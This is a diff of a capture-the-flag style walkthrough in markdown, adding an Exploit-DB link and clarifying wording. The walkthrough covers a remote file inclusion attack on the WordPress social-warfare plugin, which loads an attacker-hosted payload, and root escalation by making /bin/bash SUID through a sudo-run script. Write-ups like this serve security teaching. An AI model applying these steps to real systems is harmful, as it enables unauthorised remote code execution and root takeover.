@@ -64,7 +64,7 @@ Looks like the `social-warfare` suffers a Remote Code Execution vulnerability!
 
 # Initial Foothold
 
-**The `46794.py` python exploit contains 2 things:**
+**The [`46794.py`](https://www.exploit-db.com/exploits/46794) python exploit contains 2 things:**
 
 - Remote File Inclusion(RFI) in `wp-admin/admin-post.php?swp_debug=load_options&swp_url=<OUR_HOSTED_RFI_FILE>`
 - Specify the payload file that we hosted.
@@ -194,7 +194,7 @@ This time `steven` is able to run `/opt/tools/server-health.sh` as `root`!
 
 1. Create a directory called `tools` and Change Directory to it.
 
-2. Make a malicious Bash script that will add SUID bit set to `/bin/bash`, and mark it as executable.
+2. Make a malicious Bash script that will add SUID bit set to `/bin/bash`, and mark the Bash script as executable.
 
 3. Run `/opt/tools/server-health.sh` with `sudo`, verify SUID bit set in `/bin/bash`, and spawn a `/bin/bash` shell with SUID privilege.
 
